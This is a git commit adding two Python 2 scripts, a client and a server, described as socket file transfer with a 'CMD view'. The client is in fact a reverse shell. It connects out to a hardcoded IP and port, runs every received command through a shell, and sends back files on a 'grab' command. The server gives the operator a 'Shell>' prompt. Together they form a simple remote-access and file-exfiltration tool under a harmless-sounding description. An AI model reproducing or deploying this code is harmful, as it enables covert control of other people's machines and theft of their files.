cd3972c371bdb11e978bafbad22b2c496695f1a5
nehalchoraria <nehalchoraria09@gmail.com>
2017-05-27 18:25:51 +0530

    Add files via upload
    Transfer files between client and server using sockets in python. CMD view is available from server of client.

---
+++ TransferFiles/client.py
@@ -0,0 +1,44 @@
+import socket
+import subprocess
+import os
+
+def transfer(s,path):
+	if os.path.exists(path):
+		f  = open(path,'rb')
+		packet = f.read(1024)
+		while packet != "":
+			s.send(packet)
+			packet = f.read(1024)
+		s.send('DONE')
+		f.close
+	else:
+		s.send('Unable to find the file')
+
+
+def connect():
+	s =  socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(("192.168.120.129",8080))
+	
+	while 1:
+		command = s.recv(1024)
+		
+		if 'terminate' in command:
+			s.close() 
+			break
+		
+		elif 'grab' in command:
+			grab,path = command.split('*')
+			try:
+				transfer(s,path)
+			except Exception,e:
+				s.send (str(e))
+				pass
+		
+		else:
+			CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+			s.send(CMD.stdout.read())
+			s.send(CMD.stderr.read())
+			
+def main ():
+	connect()
+main()
---
+++ TransferFiles/server.py
@@ -0,0 +1,42 @@
+import socket
+
+
+def transfer(conn,command):
+	conn.send(command)
+	f = open('/root/Desktop/test.png','wb')
+	while True:
+		bits = conn.recv(1024)
+		if 'Unable to find the file' in bits:
+			print 'Unable to find file'
+			break
+		if bits.endswith('DONE'):
+			print 'Transfer completed'
+			f.close
+			break
+		f.write(bits)
+	f.close
+
+def connect():
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.bind(("192.168.120.129",8080))
+	s.listen(1)
+	print "Listening"
+	conn, addr = s.accept()
+	print 'We got connection from' , addr
+	
+	while True:
+		command = raw_input("Shell> ")
+		if 'terminate' in command:
+			conn.send('terminate')
+			conn.close()
+			break
+		elif 'grab' in command:
+			transfer(conn,command)
+		else:
+			conn.send(command)
+			print conn.recv(1024)
+			
+def main():
+	connect()
+	
+main()
